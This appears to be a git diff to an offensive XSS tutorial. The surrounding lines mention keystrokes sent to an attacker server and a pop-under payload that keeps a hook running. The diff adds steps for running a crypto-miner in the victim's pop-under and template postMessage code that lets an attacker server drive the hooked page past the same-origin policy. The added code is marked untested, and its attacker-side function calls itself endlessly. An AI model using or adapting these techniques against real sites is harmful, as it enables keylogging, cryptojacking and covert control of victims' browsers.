@@ -154,14 +154,13 @@ function zx(e){
 
 If you now goto the list and enter keys they will be send to attackerserver.
 
-### Make XSS persistent
+### Run JavaScript in Background
 
 #### Pop-Under
 
-First of all we need to create a page where our javascript hook lives. Therefore we create a pop-under.
-After we have this, we could use Cross-Messaging (see e.g. [1](https://javascript.info/cross-window-communication) or [2](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate with our xss-hooked application.
+We create a pop-under where our javascript hook lives. 
 
-Following payload works as pop-under on the following browsers if you allow popups for the side:
+Following payload works on the listed browsers if you allow popups for the side:
 
 - Google Chrome 65.0.3325.181
 - Firefox 59.0.2
@@ -206,6 +205,48 @@ setTimeout(function(){
 	if (goBack) {goBack.focus();}
 }, 100);
 </script>
+```
+
+#### Crypto-Miner
+
+Start Crypto-Miner in the Pop-Under (e.g. [GitHub CryptoNoter](https://github.com/cryptonoter/CryptoNoter)
+
+### Run JavaScript from Attacker-Server
+
+We can use Cross-Messaging (see e.g. [1](https://javascript.info/cross-window-communication) or [2](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate with our xss-hooked application (and to circumvent Same-Origin-Policy).
+
+e.g. (not tested, templates)
+
+Attacker-Server:
+
+doSomething.js:
+```
+function post(msg) {
+	var msg = "Do something"; // Can be string or numeric
+	parent.postMessage(msg, '*');
+	post();
+}
+```
+
+In XSS'ed Page:
+
+```<script>
+function listener(event) {
+	if (event.origin != 'https://myotherdomain.com') {
+		return
+	}
+	var info = event.data;
+	DoSomething(info);
+}
+</script>
+
+// Set up event handler wenn parent page loads
+
+if (window.addEventListener) {
+	addEventListener("message", listener, false)
+} else {
+	attachEvent("onmessage", listener);
+}
 ```
 
 # Configuration in more Detail
